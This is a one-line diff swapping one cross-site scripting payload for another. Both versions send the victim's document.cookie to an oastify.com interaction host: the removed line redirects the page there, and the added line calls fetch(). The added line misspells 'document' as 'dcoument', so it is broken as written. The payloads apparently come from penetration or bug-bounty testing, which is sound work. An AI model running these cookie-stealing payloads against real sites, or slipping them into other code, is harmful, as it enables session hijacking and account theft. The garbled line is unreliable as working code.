@@ -1,1 +1,1 @@
-<script>document.location="http://qsm3vcljiwh22d2iuny52enmcdi56u.oastify.com"+document.cookie</script>
+fetch('http://4x2h0qqxnamg7r7wz13j7ss0hrnlba.oastify.com?t='+dcoument.cookie);
